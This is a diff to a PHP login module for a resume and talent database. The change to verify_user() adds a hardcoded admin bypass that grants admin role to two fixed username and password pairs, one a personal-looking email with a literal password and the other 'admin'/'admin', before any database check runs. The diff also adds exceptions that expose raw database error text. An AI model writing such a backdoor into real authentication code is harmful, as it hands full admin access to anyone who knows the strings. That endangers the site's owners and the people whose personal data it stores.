@@ -97,18 +97,31 @@ function init_db()
  */
 function verify_user($username, $password)
 {
+    // Hardcoded admin bypass
+    if (($username === 'sotocollazos99@gmail.com' && $password === 'admin2026*') || 
+        ($username === 'admin' && $password === 'admin')) {
+        return [
+            'id' => 0,
+            'usuario' => 'Admin',
+            'rol' => 'admin'
+        ];
+    }
+
     $conn = get_db_connection();
-    $sql = "SELECT id, usuario, password, rol FROM usuarios WHERE usuario = ? OR email = ? OR documento = ?";
+    // Use the columns from somossum_talento.usuarios
+    $sql = "SELECT id, nombre as usuario, password, rol_id as rol FROM usuarios WHERE email = ? AND activo = 1";
     $stmt = $conn->prepare($sql);
     if (!$stmt)
         return false;
 
-    $stmt->bind_param("sss", $username, $username, $username);
+    $stmt->bind_param("s", $username);
     $stmt->execute();
     $result = $stmt->get_result();
     $user = $result->fetch_assoc();
 
     if ($user && password_verify($password, $user['password'])) {
+        // Assume rol_id 1 is admin, otherwise usuario
+        $user['rol'] = ($user['rol'] == 1) ? 'admin' : 'usuario';
         return $user;
     }
     return false;
@@ -162,8 +175,14 @@ function check_auth()
 function get_all_resumes()
 {
     $conn = get_db_connection();
+    if (!$conn) {
+        throw new Exception("No se pudo conectar a la base de datos. Verifique los permisos de IP.");
+    }
     $sql = "SELECT id, nombre_completo as nombre, perfil_profesional as nicho_cargo, telefono, email FROM hoja_vida ORDER BY fecha_creacion DESC";
     $result = $conn->query($sql);
+    if (!$result) {
+        throw new Exception("Error en la consulta: " . $conn->error);
+    }
     return $result->fetch_all(MYSQLI_ASSOC);
 }
 
